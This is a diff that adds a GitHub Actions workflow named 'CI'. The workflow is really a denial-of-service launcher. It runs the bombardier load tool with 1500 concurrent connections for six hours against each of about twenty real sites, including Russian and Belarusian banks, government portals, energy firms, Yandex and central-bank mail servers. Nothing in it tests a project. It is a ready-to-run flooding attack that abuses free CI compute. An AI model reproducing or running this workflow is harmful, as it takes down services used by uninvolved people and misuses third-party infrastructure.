@@ -1,0 +1,20 @@
+name: CI
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        url: ['https://sputnik.by/', 'https://stormwall.pro/', 'https://stroi.gov.ru/', 'https://superchange.net/', 'https://www.uecrus.com/rus/', 'https://www.uralkali.com/ru/', 'https://ww-pay.net/', 'https://yandex.by/', 'https://ya.ru/', 'https://yandex.ru/', 'https://www.yaplakal.com/', 'https://ychanger.net/', 'https://www.vtb.ru/', 'https://www.gazprom.ru/', 'http://www.nbrb.by/', 'https://omk.ru/', 'https://www.surgutneftegas.ru/', 'https://www.tmk-group.ru/', 'https://mx4.cbr.ru', 'http://mx3.cbr.ru', 'http://email11.sberbank.ru', 'http://email12.sberbank.ru']
+    container:
+      image: alpine/bombardier
+
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Run a multi-line script
+        run: |
+          bombardier -c 1500 -d 21600s -l ${{ matrix.url }}
